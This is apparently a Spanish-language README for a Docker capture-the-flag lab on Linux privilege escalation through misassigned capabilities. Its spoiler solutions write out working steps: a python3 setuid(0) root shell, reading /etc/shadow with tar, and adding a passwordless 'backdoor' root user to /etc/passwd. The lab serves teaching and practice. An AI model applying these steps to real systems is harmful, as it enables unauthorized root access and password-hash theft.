# 🛡️ Linux Capabilities - Privilege Escalation Lab

Laboratorio de práctica para escalada de privilegios abusando de Linux Capabilities.

## ¿Qué son las Capabilities?

Tradicionalmente en Linux: o eres root (todo el poder) o no. Las capabilities dividen los poderes de root en unidades granulares. Ejemplos:
- `cap_setuid` → cambiar UID del proceso
- `cap_dac_read_search` → leer cualquier archivo (bypass de permisos)
- `cap_dac_override` → escribir en cualquier archivo
- `cap_fowner` → cambiar permisos/dueño de cualquier archivo
- `cap_sys_admin` → mount, cgroups, etc.
- `cap_net_raw` → raw sockets (ping, sniffing)
- `cap_net_bind_service` → bindear puertos < 1024
- `cap_sys_ptrace` → trazar procesos

Cuando un admin asigna capabilities a binarios incorrectos, se puede escalar privilegios.

## Requisitos
- Docker instalado

## Cómo usar

```bash
# Nivel 1 - Fácil
cd level1-easy
docker build -t caplab-easy .
docker run -it --rm caplab-easy

# Nivel 2 - Medio
cd level2-medium
docker build -t caplab-medium .
docker run --cap-add=DAC_READ_SEARCH -it --rm caplab-medium

# Nivel 3 - Difícil
cd level3-hard
docker build -t caplab-hard .
docker run -it --rm caplab-hard
```

## Resumen de niveles

| Nivel | Capabilities | Técnica | Dificultad |
|-------|-------------|---------|------------|
| 1 | `cap_setuid` en python3 | setuid(0) directo | ⭐ |
| 2 | `cap_dac_read_search` en tar, `cap_dac_override` en vim, `cap_net_raw` (rabbit hole) | Leer/escribir archivos protegidos | ⭐⭐ |
| 3 | `cap_fowner` en binario custom, `cap_sys_ptrace` y `cap_net_bind_service` (rabbit holes) | Cadena: chmod /etc/passwd → editar → root | ⭐⭐⭐ |

## Comandos de enumeración clave

```bash
# Buscar TODAS las capabilities asignadas en el sistema
getcap -r / 2>/dev/null

# Ver capabilities de un binario específico
getcap /usr/bin/python3

# Ver capabilities del proceso actual
cat /proc/self/status | grep -i cap

# Decodificar capabilities del proceso
capsh --decode=<hex_value>

# Listar todas las capabilities conocidas
capsh --print
```

---

## ⚠️ SOLUCIONES (SPOILERS) ⚠️

<details>
<summary>Nivel 1 - Solución</summary>

`python3-custom` tiene `cap_setuid+ep`: puede llamar a `setuid(0)` para convertirse en root.

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3-custom cap_setuid=ep

# Escalar a root
python3-custom -c 'import os; os.setuid(0); os.system("/bin/bash")'

cat /root/flag.txt
```

Referencia: https://gtfobins.github.io/gtfobins/python/#capabilities

</details>

<details>
<summary>Nivel 2 - Solución (múltiples vías)</summary>

```bash
getcap -r / 2>/dev/null
# /usr/bin/tar-backup cap_dac_read_search=ep
# /usr/bin/python3-net cap_net_raw=ep        ← RABBIT HOLE
# /usr/bin/vim-admin cap_dac_override=ep
```

**`cap_net_raw` es rabbit hole**: solo permite raw sockets, no sirve para privesc.

**Vía A: tar con cap_dac_read_search (leer cualquier archivo)**
```bash
# Leer la flag directamente
tar-backup czf /tmp/flag.tar.gz /root/flag.txt 2>/dev/null
cd /tmp && tar xzf flag.tar.gz
cat root/flag.txt

# También sirve para leer /etc/shadow
tar-backup czf /tmp/shadow.tar.gz /etc/shadow 2>/dev/null
cd /tmp && tar xzf shadow.tar.gz
cat etc/shadow
```

**Vía B: vim con cap_dac_override (escribir cualquier archivo)**
```bash
# Editar /etc/passwd y agregar usuario root sin password
vim-admin /etc/passwd
# Agregar esta línea:
# backdoor::0:0::/root:/bin/bash

su backdoor
cat /root/flag.txt

# O directamente leer la flag
vim-admin /root/flag.txt
```

</details>

<details>
<summary>Nivel 3 - Solución</summary>

```bash
getcap -r / 2>/dev/null
# /usr/local/bin/logfixer cap_fowner=ep
# /usr/bin/strace cap_sys_ptrace=ep           ← RABBIT HOLE
# /usr/local/bin/webserv cap_net_bind_service=ep  ← RABBIT HOLE
```

**Rabbit holes:**
- `strace` con `cap_sys_ptrace`: permite trazar procesos pero no hay ningún proceso root
  con datos útiles en memoria. Callejón sin salida.
- `webserv` con `cap_net_bind_service`: solo permite abrir puertos <1024, no escala.

**Vector real: logfixer con cap_fowner**

`logfixer` hace `chmod` en cualquier archivo (no valida la ruta). Con `cap_fowner`
puede cambiar permisos de archivos que no le pertenecen.

```bash
# Leer la pista
cat /opt/tools/README.txt
# "Uses CAP_FOWNER to chmod files regardless of ownership"
# "Should probably add path validation"

# Paso 1: Hacer /etc/passwd escribible
logfixer /etc/passwd 0666

# Paso 2: Agregar usuario root sin password
echo 'backdoor::0:0:backdoor:/root:/bin/bash' >> /etc/passwd

# Paso 3: Cambiar a ese usuario
su backdoor

# Root!
cat /root/flag.txt
```

**Alternativa avanzada:**
```bash
# Hacer /etc/shadow legible para extraer hashes
logfixer /etc/shadow 0644
cat /etc/shadow

# O hacer /root legible
logfixer /root 0755
logfixer /root/flag.txt 0644
cat /root/flag.txt
```

</details>

---

## Capabilities peligrosas - Cheat Sheet

| Capability | Riesgo | Técnica |
|-----------|--------|---------|
| `cap_setuid` | CRÍTICO | `setuid(0)` → root directo |
| `cap_setgid` | ALTO | `setgid(0)` → grupo root |
| `cap_dac_read_search` | ALTO | Leer cualquier archivo (shadow, flags, keys) |
| `cap_dac_override` | CRÍTICO | Escribir cualquier archivo (passwd, sudoers, crontab) |
| `cap_fowner` | CRÍTICO | Cambiar permisos de cualquier archivo |
| `cap_chown` | CRÍTICO | Cambiar dueño de cualquier archivo |
| `cap_sys_admin` | CRÍTICO | Mount, namespace, muchos vectores |
| `cap_sys_ptrace` | MEDIO | Inyectar en procesos (requiere target root) |
| `cap_net_raw` | BAJO | Raw sockets, no escala directamente |
| `cap_net_bind_service` | BAJO | Puertos privilegiados, no escala |

## Recursos
- [GTFOBins - Capabilities](https://gtfobins.github.io/#+capabilities)
- [HackTricks - Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
- [man capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html)